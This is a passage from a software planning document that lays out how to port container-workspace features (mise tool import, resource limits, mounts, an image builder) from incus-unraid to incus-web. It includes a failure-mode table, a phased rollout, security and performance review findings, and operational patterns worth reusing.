- **Simplicity + architecture review**: incus-web already has a working runtime mise-install step (`DOTFILES_RUN_MISE`) — the smaller, lower-risk lift is to seed `/etc/mise/config.d/` with the imported `mise.toml`/`.tool-versions` content for that *existing* step to pick up, not to build a new build-time image-baking path. This avoids creating two competing mise-install code paths, which the original plan correctly flagged as a risk but left unresolved as an open decision — this revision resolves it: **seed the runtime path, don't bake at build time.**
- **Security review (High H2)**: same untrusted-parser hardening as 2.5 — file-size cap, well-maintained TOML parser, and if any of this content ever crosses into a privileged host context (it currently wouldn't, under the runtime-seed approach), re-validate server-side rather than trusting client-side parsing alone.

**Porting approach** (revised, decision resolved):
1. (S) Near-verbatim port: translate `parseMiseToolsTable`, `parseToolVersionsFile` into `apps/web/lib/import/mise.ts`. Add the same file-size cap as 2.5.
2. **(Decision resolved)**: target the existing **runtime** install path, not build-time baking. On import, write the parsed tool pins into `/etc/mise/config.d/<workspace>.toml` (or equivalent) via the existing dotfiles-apply/`RunSetup` flow, so the already-scheduled `mise install` runtime step picks them up. No new provisioner command, no image-build changes.
3. (XS) Skip porting the dotfiles-bootstrap-via-mise sub-feature — incus-web already has its own, more developed dotfiles/chezmoi flow (`DOTFILES_RUN_MISE`, `bootstrap-server.mjs`); reconcile rather than duplicate.
4. (XS) Skip `mise oci build` evaluation — already correctly rejected by incus-unraid, no need to re-litigate.

**Effort**: S, decision no longer blocking (resolved above: runtime seed, not build-time bake). **Risk**: low — the two repos' mise integration models differ in *when* installation happens, and this revision deliberately avoids introducing a second (build-time) mechanism that would compete with the existing runtime one.

---

## 3. Failure modes (from engineering review, per proposed codepath)

| Codepath | Failure mode | Rescued? | Test? | User sees? | Logged? |
|---|---|---|---|---|---|
| `SetWorkspaceLimits`/`SetWorkspaceMount` without an authorization tier | Any actor who can start their workspace can also uncap limits or mount arbitrary host paths in | N | N | Silent (succeeds) | N |
| Mount path-traversal guard, undesigned | Symlink or relative path mounts host `/etc` or `/` into the container | N | N | Silent (succeeds) | N |
| Builder input interpolated into distrobuilder YAML (if ever built without the isolation/structured-YAML constraints in §2.2) | Shell/YAML injection executes arbitrary commands in a privileged host build context | N | N | Silent (succeeds) | N |
| `BuildImage` run inside the existing 4-slot `acquireIncusSlot()` pool (if ever built without a separate pool) | A multi-minute build occupies a global concurrency slot; unrelated start/stop/restart requests time out for the build's full duration | N | N | Visible but confusing ("busy"/timeout) | Y (timeout error) |
| File-backed build/log registry reusing `agent-runs.mjs`'s full-file read-modify-write pattern | O(n) rewrite per log line; append latency degrades as build/log history accumulates | N | N | Silent (latency creep) | N |
| `statusCache`/`statusInFlight` as bare variables + any multi-workspace or live-polling UI | Second workspace's status poll collides with/invalidates the first; cache never actually caches, multiplying `incus` subprocess spawns | N | N | Silent (eventual pool exhaustion) | N |
| Limits vs. mounts clear-semantics inconsistency (omit-clears vs. empty-does-not-clear) implemented without a contract test | UI shows "cleared" while Incus still holds a stale privileged resource override | N | N | Silent (drift) | N |

Every row above is a **CRITICAL GAP** as originally proposed (unrescued, untested, silent) — expected for a planning-stage document with no code yet. §2.2 and §2.4 above now specify the fixes required before implementation; §6 marks the highest-risk item (the Builder) as cut pending a demonstrated need.

---

## 4. Suggested phasing (revised)

**Phase 0 — Prerequisites (blocking, do first, small)**
1. Convert `provisioner-server.mjs`'s `statusCache`/`statusInFlight` from bare variables to a `Map` keyed by workspace ID (§2.3 item 1) — currently harmless, becomes a correctness bug the moment any per-workspace live polling or multi-workspace support exists; cheap to fix now while it's simple.
2. Design and document the authorization-tier check (`actorCanMutateWorkspaceConfig` or equivalent) required by §2.4 — this is a prerequisite for *any* mutating command, not part of the command's own task.

**Phase 1 — Quick wins (S effort, low risk, no architecture change)**
3. Confirm/document Tailscale parity (2.1) — write it up, verify CGNAT ACL question, confirm secret-delete-before-imported-command ordering, close the loop with Jacob.
4. Port `.devcontainer/devcontainer.json` parsing logic + diff-preview UI (2.5) — standalone, no Builder dependency. Includes file-size cap and provenance-warning additions from the security review.
5. Port `.tool-versions`/mise.toml parsing logic (2.6), targeting the existing runtime install path (decision resolved, no longer pending).
6. Add `SetWorkspaceLimits` provisioner command — **only after Phase 0 item 2 (authorization tier) lands** — with client+server validation, `statusCache` invalidation, and the clear-semantics contract test (§2.4 steps 3-5).

**Phase 2 — Medium (M effort, extends existing contract/UI, moderate risk)**
7. Add `SetWorkspaceMount`/`ClearWorkspaceMount` commands (2.4 step 6), using the concretely-specified path/mount allowlist (§2.4 step 2) and its own clear-semantics contract test.
8. Build a minimal Details panel in the dashboard (2.3 item 2) to surface and edit the above, gated by the authorization tier from Phase 0.

**Phase 3 — Cut / gated backlog (not scheduled — see §6 for why)**
9. Interactive Builder pipeline (2.2) — full 9-point design constraint list specified in §2.2; only start this if a specific, named pain point emerges from actually using the CI-driven pipeline.
10. Full package-search-across-managers UX (2.2 step 4-equivalent) — only relevant if item 9 ever starts.
11. Multi-workspace list+detail dashboard UX — only relevant if incus-web's product direction actually moves beyond one-workspace-per-actor; if it does, any new route must reuse the existing `getWorkspaceRefForActor` + ID-match pattern (security review M2).
12. Read-only or editable "Config" surface for access-mode/network/profile settings currently only in `.env`/YAML — evaluate need first.
13. Snapshot/backup UI — neither repo has this fully built; worth a dedicated design pass using the ZFS golden-container clone infrastructure incus-web already has (`scripts/build-agent-golden.sh`) as the storage-layer foundation, rather than porting anything from incus-unraid (which also doesn't have this).

Dependency notes: Phase 1 items 4-5 (importers) are fully independent of everything else and can ship immediately — they no longer block on or get blocked by any other phase. Phase 1 item 6 and all of Phase 2 depend on Phase 0 item 2 (authorization tier) landing first. Phase 3 items are explicitly not scheduled; each requires a fresh trigger/justification before starting, not just "it's next in the list."

---

## 5. Engineering review summary

This plan was reviewed by four parallel passes (architecture, simplicity, security, performance) before implementation began. Findings, already folded into §§2-4 above:

- **Architecture**: `contracts.ts` is a closed, exhaustively-validated command protocol; new commands must extend it with the same discipline (typed payload/result validators, `hasOnlyKeys` allow-lists). `BuildImage` cannot be a synchronous command given multi-minute build times — needs an explicit async dispatch+poll pattern and idempotency keys from day one, not retrofitted later.
- **Simplicity**: the interactive Builder pipeline (§2.2) was the single largest scope inflator with no demonstrated need — cut to a gated backlog item. The two importers (§2.5, §2.6) were incorrectly sequenced behind it despite being pure-function, low-risk, high-value work — decoupled and promoted to Phase 1.
- **Security**: 3 critical findings, all now addressed in §2.4/§2.2 — no authorization tier for mutating commands (now a Phase 0 blocking prerequisite), an undesigned path-traversal guard (now concretely specified), and unsanitized input reaching a privileged host build tool (now gated behind isolation/structured-YAML constraints if the Builder is ever built). Plus 3 high findings on imported-command provenance, untrusted parser hardening, and build-log access control — folded into §2.2/§2.5/§2.6.
- **Performance**: the 4-slot global concurrency pool, the bare-variable status cache, and the full-file-rewrite build/log registry pattern were all identified as latent bottlenecks that would activate the moment builder/multi-workspace/live-polling work landed — addressed via the Phase 0 cache fix and the §2.2 design constraints.

Full per-agent findings, exploit scenarios, and remediation priority are preserved in this repo's session history; this document reflects the applied outcome.

---

## 6. Not in scope (cut from committed plan)

- **Interactive Builder UI, package-search-across-managers, image variant tracking** (originally §2.2 steps 3-5) — no demonstrated incus-web pain point beyond "incus-unraid has it"; carries the plan's highest security/performance risk if built without the constraints specified in §2.2. Revisit only on a concrete trigger.
- **Details/Config/Builder dashboard tabs beyond the minimal Details panel in Phase 2** (originally §2.3 items 3-4) — downstream UI for backend capability that's cut or gated; building it first would be pure speculation.
- **Mount CRUD generalization / `JAIL_BIND_MOUNTS`-equivalent** (originally §2.4 item 5) — incus-web already has a working ad hoc mechanism for agent-run credential injection; generalizing it is a refactor with no new capability, not a porting task.
- **Multi-workspace list+detail dashboard UX** (originally §2.3 item 1) — conditional on a product decision (does incus-web support >1 workspace/actor?) that hasn't been made; don't build UI for a data-model capability that isn't a committed product direction.
- **Env var CRUD UI** — neither repo has a compelling pattern worth porting as-is; correctly self-rejected in the original research, unchanged here.
- **Dotfiles-bootstrap-via-mise sub-feature** — incus-web already has a more developed dotfiles/chezmoi flow; reconcile rather than duplicate, unchanged from original research.

---

## 7. Other useful patterns worth porting

Beyond the 6 headline features, the incus-unraid research surfaced several implementation patterns worth adopting regardless of feature parity:

- **Two-level-nested Incus operation envelopes**: incus-unraid's `CLAUDE.md:47` flags that async Incus operations return `response.metadata.metadata.<field>` (nested twice) — a real gotcha. incus-web's provisioner mostly shells out to the `incus` CLI (`incus query`, `incus exec`, etc.) rather than talking to the REST API directly, so it may not hit the same nesting depth — worth a quick audit of `provisioner-server.mjs:279-337` rather than assuming either repo is right.
- **`</dev/null` stdin redirection on every bare `incus` CLI call**: incus-unraid learned the hard way that several `incus` subcommands (confirmed: `profile create`) hang indefinitely waiting on stdin even in non-interactive scripts (`CLAUDE.md:52`, `incus-init.sh` throughout). Audit `scripts/incus-web-lib.sh` and `provisioner-server.mjs`'s `run()`/`spawn()` calls for the same protection — if any `incus` invocation doesn't explicitly close/redirect stdin, it's a latent hang risk.
- **Preflight gating over fail-fast**: incus-unraid's `incus-preflight.sh` checks glibc version, cgroup v2, `newuidmap`/`newgidmap`, `nft`/`unsquashfs` presence *before* running anything, because their absence causes indefinite hangs (not clean errors) in `incusd`/`distrobuilder`. If incus-web's deploy/provisioner path doesn't have an equivalent preflight step, this is a good defensive addition, particularly relevant if §2.2's Builder is ever revisited (distrobuilder invoked directly on the host, not just via CI where the environment is controlled).
- **Idempotent, `flock`-guarded init scripts**: `incus-init.sh:22-24` guards concurrent execution with `flock` on `/var/run/incus-init.lock`, and every resource (pool/ACL/bridge/profile) is existence-checked before creation. Worth confirming `scripts/incus-web-lib.sh`'s `ensure_agent_network()` and friends have equivalent idempotency/concurrency guards.
- **Graceful daemon shutdown with fallback + child reaping**: `rc.incus:45-59` tries `incus admin shutdown` (cascades to stop instances per their own config) before falling back to a raw `kill` by pidfile, and explicitly reaps orphaned `dnsmasq` children by pattern match since a raw kill doesn't cascade to incusd's spawned subprocesses. Not directly applicable to incus-web (which doesn't manage the incusd lifecycle itself, presumably relying on the host's own incus/incusd service), but worth a sanity check that host-level incus restarts/upgrades on the box running incus-web's provisioner don't leave orphaned subprocesses.
- **Bridge idempotency/repair distinguishing managed-vs-stale interfaces**: `incus-init.sh:172-190` — tears down and recreates a same-named bridge if it's not properly Incus-managed (`managed: true`), rather than failing on `network set`. incus-web's `ensure_agent_network()` (`scripts/incus-web-lib.sh:109-149`) should be checked for the same class of stale-state recovery.
- **subuid/subgid bootstrap that doesn't clobber other tools' entries**: incus-unraid's binary-unpack install path means the usual apt postinst hook that populates `/etc/subuid`/`/etc/subgid` never runs — `incus-init.sh:48-59` adds a `root:` entry only if none exists at all, careful not to clobber Docker-rootless/Podman entries. Relevant if incus-web's target hosts also run other rootless container tooling.
- **Security posture defaults for launched containers**: incus-unraid's `agent-jail-profile.yaml.tmpl` sets `security.privileged: "false"`, `security.idmap.isolated: "true"`, non-root user with `lock_passwd: true`/`usermod -p '*'`, `disable_root: true`, `ssh_pwauth: false`. Cross-check `incus-web-profile.yaml` and `distrobuilder.yaml`'s `agent` user setup already match this bar (worth an explicit side-by-side diff — this is exactly the kind of security-relevant default that's easy to silently drift).
- **Package-search resilience pattern** (`Promise.allSettled` + in-flight request dedup, `incus-package-search.service.ts:75-92`) — directly reusable if/when incus-web builds any multi-source search feature; add a per-query-string TTL cache alongside the in-flight dedup (performance review addition — external registry latency is a different risk class than local `incus` CLI latency).
- **Terminology-split-is-fine precedent**: incus-unraid deliberately keeps internal identifiers as "jail" (`Jail` GraphQL type, `JAIL_*` config keys) while all user-facing copy says "dev container" (`README.md:11-13`, `CLAUDE.md:54`) — an explicit, documented decision not to rename internals to match UX copy. Worth citing as precedent if incus-web ever debates a similar internal-vs-external naming question.
- **First test suite added late, hand-rolled stubs over real deps**: incus-unraid's `2026.07.07q` changelog shows its first vitest suite (30 tests) used hand-rolled `test-stubs/` for `@nestjs/*`/`class-validator`/`class-transformer` rather than pulling in real test dependencies for a NestJS app — a pragmatic pattern for testing config round-trips and business logic without standing up a full NestJS test harness. Relevant if incus-web's provisioner (`scripts/provisioner-server.mjs`, plain Node with no framework) needs a similarly lightweight test strategy for its command-dispatch logic.
